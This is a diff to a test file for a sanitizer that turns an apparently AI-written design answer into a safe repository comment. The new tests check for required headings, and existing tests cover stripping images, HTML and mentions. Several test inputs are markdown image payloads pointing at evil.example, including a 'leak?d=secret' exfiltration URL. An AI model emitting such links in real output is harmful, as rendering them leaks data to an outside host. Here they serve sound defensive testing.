@@ -129,7 +129,9 @@ test('designReadAllowed accepts only listed files, by relative or absolute path 
 test('designComment wraps the answer with the marker and the approval note, and defuses what a comment must not carry', () => {
   expect(designComment('too short')).toBeNull()
   expect(designComment('')).toBeNull()
-  const answer = `## Understanding\nAdd a dark mode toggle to the settings screen so people can switch.\n![x](https://evil.example/p.png) <img src=x> ping @maria ${DESIGN_MARKER}\nROADMAP-DONE`
+  expect(designComment('Here is my private session answer about something else entirely, long enough to pass the length check.')).toBeNull()
+  expect(designComment('## Understanding\nOnly one of the two required headings is present in this long enough answer.')).toBeNull()
+  const answer = `## Understanding\nAdd a dark mode toggle to the settings screen so people can switch.\n## Proposed approach\n![x](https://evil.example/p.png) <img src=x> ping @maria ${DESIGN_MARKER}\nROADMAP-DONE`
   const c = designComment(answer)!
   expect(c.startsWith(`${DESIGN_MARKER}\n## Understanding`)).toBe(true)
   expect(c.split(DESIGN_MARKER)).toHaveLength(2)
@@ -138,12 +140,12 @@ test('designComment wraps the answer with the marker and the approval note, and 
   expect(c).not.toContain('<img')
   expect(c).not.toContain('@maria')
   expect(c).toContain(`\`${LABEL_GO}\``)
-  expect(designComment('x'.repeat(20000))!.length).toBeLessThan(12600)
-  const refImage = designComment('## Understanding\nSee ![alt][r] and ![r] and ![x](https://evil.example/a.png) for context on the request.\n\n[r]: https://evil.example/leak?d=secret\n')!
+  expect(designComment(`## Understanding\n## Proposed approach\n${'x'.repeat(20000)}`)!.length).toBeLessThan(12600)
+  const refImage = designComment('## Understanding\n## Proposed approach\nSee ![alt][r] and ![r] and ![x](https://evil.example/a.png) for context on the request.\n\n[r]: https://evil.example/leak?d=secret\n')!
   expect(refImage).not.toContain('![')
   expect(refImage).not.toContain('evil.example/a.png')
   for (const bang of ['!', '!!', '!!!', '!!!!!']) {
-    const c = designComment(`## Understanding\nContext for the request follows. ${bang}[a][r] and ${bang}[r] here.\n\n[r]: https://evil.example/leak\n`)!
+    const c = designComment(`## Understanding\n## Proposed approach\nContext for the request follows. ${bang}[a][r] and ${bang}[r] here.\n\n[r]: https://evil.example/leak\n`)!
     expect([bang, /!+\[/.test(c)]).toEqual([bang, false])
   }
 })
